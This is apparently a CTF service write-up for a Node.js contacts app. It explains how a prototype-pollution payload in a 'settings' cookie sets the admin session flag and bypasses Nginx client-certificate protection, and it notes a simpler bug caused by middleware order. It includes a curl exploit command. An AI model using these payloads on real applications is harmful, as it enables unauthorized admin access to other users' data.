# pure

## Service Description
`pure` is a service to create/edit contacts. It is written in JavaScript and uses MongoDB as a data storage and Nginx as a reverse proxy:

The user interface allows to:

1. Register a new user:

2. Create a contact:

3. Change theme to dark mode:

Also there is an admin interface that allows to view contacts of all users:

The access to the admin pages is protected using client certificate authentication. This protection is implemented with Nginx:


    server {
        ...
        ssl_client_certificate /etc/ssl/certs/ca.crt;
        ssl_verify_client optional;

        location / {
            ...
            proxy_set_header VERIFIED $ssl_client_verify;
            ...
        }
    }


Nginx checks the client certificate and set `VERIFIED` HTTP header. The application uses this header to set `req.session.isAdmin` property:


    if (req.headers && req.headers['verified'] == 'SUCCESS' && req.session) {
        req.session.isAdmin = true;
    } else {
        if (req.session && req.session.isAdmin) {
            delete req.session.isAdmin;
        }
    }


## Vulnerability Description

To steal the flags, teams should somehow set `req.session.isAdmin` property to `true` in the Node.JS application.

### Intended Way to Exploit
Property `req.session.isAdmin` can be set to `true` by exploiting the [Prototype Pollution](https://portswigger.net/web-security/prototype-pollution) vulnerability.

`cookieSettingsHandler` in [web/middlewares.js](../../services/pure/web/middlewares.js) allows to set arbitrary property name and an attacker could send a specially crafted `settings` cookie containing JSON-encode object `j:["__proto__",":",{"isAdmin": true, "cookie":{"originalMaxAge":null,"expires":null,"httpOnly":true,"path":"/"}}]`. This object will be decoded by the `cookieParser()`, and the following assignment will be executed:

```
req.session["__proto__"] = {"isAdmin": true, "cookie":{"originalMaxAge":null,"expires":null,"httpOnly":true,"path":"/"}};
```

### Unintended Way to Exploit

Unfortunately, the following middlewares were added in wrong order:

```
app.use(middlewares.adminHandler);
app.use(middlewares.cookieSettingsHandler);
```

Because of this, an attacker could exploit the application much easier. The following `settings` cookie could be used to set `req.session.isAdmin` property to `true`: `settings=isAdmin:1`


## Exploit

To exploit the vulnerability an attacker could send specially crafted `settings` cookie to the application:

    :::bash
    curl -k https://<HOST> --cookie 'connect.sid=<SESSION COOKIE>' --cookie \
    'settings=j:["__proto__",":",{"isAdmin": true, "cookie":{"originalMaxAge":null,"expires":null,"httpOnly":true,"path":"/"}}]'
